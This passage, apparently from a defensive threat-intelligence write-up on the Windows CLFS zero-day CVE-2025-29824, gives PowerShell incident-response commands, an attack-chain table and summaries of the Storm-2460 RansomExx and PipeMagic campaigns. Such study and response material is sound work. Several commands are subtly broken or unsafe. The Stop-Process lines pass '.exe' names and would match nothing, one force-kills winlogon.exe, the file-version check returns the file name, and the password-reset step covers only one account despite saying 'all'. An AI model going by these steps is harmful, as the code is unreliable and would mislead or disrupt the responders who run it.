Stop-Process -Name "dllhost.exe" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "procdump.exe" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "winlogon.exe" -Force -ErrorAction SilentlyContinue
```

**2. Collect Evidence:**

```powershell
# Dump memory for forensics
& "C:\Program Files\Sysinternals\procdump.exe" -ma -o -e -w "System" C:\incident\system.dmp

# Export Security event log
wevtutil epl Security C:\incident\security.evtx

# Copy suspicious files
Copy-Item "C:\ProgramData\SkyPDF\" -Recurse -Destination "C:\incident\SkyPDF_backup\"

# Hash all files for chain of custody
Get-FileHash C:\incident\* -Algorithm SHA256 | Export-Csv C:\incident\hashes.csv
```

**3. Remediate:**

```powershell
# Delete malicious files
Remove-Item "C:\ProgramData\SkyPDF\*.blf" -Force

# Remove malicious service/scheduled task
Remove-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\SuspiciousService" -Force
Get-ScheduledTask -TaskName "*suspicious*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false

# Change ALL domain administrator passwords immediately
# (Assume LSASS was dumped)
Set-ADUser -Identity "Administrator" -ChangePasswordAtLogon $true -Confirm:$false

# Force policy update
gpupdate /force

# Reboot to clean kernel state
Restart-Computer -Force
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing Campaign | Attacker tricks employee into downloading malware dropper |
| **2** | **Execution** | [E-LIVE-001] Certutil Malware Download | Attacker uses certutil to download MSBuild project file |
| **3** | **Execution** | [E-LIVE-002] MSBuild Payload Execution | MSBuild decrypts and executes PipeMagic backdoor via EnumCalendarInfoA |
| **4** | **Privilege Escalation** | **[PERSIST-SERVER-008]** | **Attacker exploits CVE-2025-29824 to escalate to SYSTEM** |
| **5** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Dump | Attacker dumps LSASS memory to extract domain credentials |
| **6** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses stolen NTLM hashes to move laterally |
| **7** | **Impact** | [I-ENCRYPT-001] RansomExx Ransomware | Attacker deploys ransomware to encrypt all files |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Storm-2460 RansomExx Campaign (April 2025)

- **Target:** Organizations in Saudi Arabia, Spain, Venezuela, USA (IT, finance, real estate sectors)
- **Timeline:** Discovered April 8, 2025 (patch release date)
- **Technique Status:** Active zero-day exploitation
- **Attack Flow:**
  1. Initial access via spearphishing attachment (malware dropper)
  2. Dropper executes certutil to download encrypted MSBuild file
  3. MSBuild uses EnumCalendarInfoA callback to decrypt PipeMagic backdoor
  4. PipeMagic launches CLFS exploit via dllhost.exe (in-memory)
  5. Exploit achieves SYSTEM privilege escalation
  6. ProCDump dumps LSASS memory containing Domain Admin credentials
  7. Lateral movement to domain controllers using stolen credentials
  8. RansomExx ransomware deployed across entire network
  9. Ransom note: `!_READ_ME_REXX2_!.txt`
- **Impact:** Multiple organizations forced to pay ransom; critical infrastructure disrupted
- **Reference:** [Microsoft MSRC: Exploitation of CLFS Zero-Day Leads to Ransomware Activity](https://www.microsoft.com/en-us/security/blog/2025/04/08/exploitation-of-clfs-zero-day-leads-to-ransomware-activity/)

### Example 2: PipeMagic Malware Family (2025)

- **Variant:** Used as initial backdoor in Storm-2460 campaigns
- **Capabilities:**
  - Persistent remote access via encrypted named pipes
  - Privilege escalation using CVE-2025-29824
  - In-memory malware execution (evasion)
  - C2 communication via legitimate services
- **Detection:** Only 23 antivirus engines detected on initial discovery (May 30, 2025)
- **Reference:** [Qi'anxin Threat Intelligence: CVE-2025-29824 Exploitation Sample Research](https://ti.qianxin.com/blog/articles/cve-2025-29824-0-day-vulnerability-exploitation-sample-research-en/)

---

## APPENDIX: Quick Test Commands

**Check Vulnerability Status:**
```powershell
# Method 1: Windows Build Check
[System.Environment]::OSVersion.Version

# Method 2: KB Check
Get-HotFix | Where-Object { $_.HotFixId -match "KB5037771" }

# Method 3: CLFS Driver Inspection
Get-Item "C:\Windows\System32\drivers\clfs.sys" | Select-Object LastWriteTime, @{N="FileVersion";E={[io.path]::GetFileNameWithoutExtension($_)}}
```

---